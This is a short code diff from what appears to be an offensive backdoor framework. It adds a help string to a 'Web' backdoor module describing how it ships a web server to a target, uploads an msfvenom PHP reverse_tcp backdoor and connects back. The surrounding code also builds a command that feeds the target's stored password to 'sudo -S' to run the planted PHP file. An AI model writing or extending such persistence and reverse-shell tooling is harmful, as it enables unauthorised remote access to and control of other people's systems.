@@ -13,7 +13,7 @@ class Web(Backdoor):
 		}
         self.allow_modules = True
         self.modules = {}
-        self.help_text = "" 
+        self.help_text = INFO + "Ships a web server to the target, then uploads msfvenom's php reverse_tcp backdoor and connects to the host. Although this is also a php backdoor, it is not the same backdoor as the above php backdoor." 
 
     def get_command(self):
         return "echo " + self.core.curtarget.pword + " | sudo -S php /var/www/html/" + self.get_value("name")
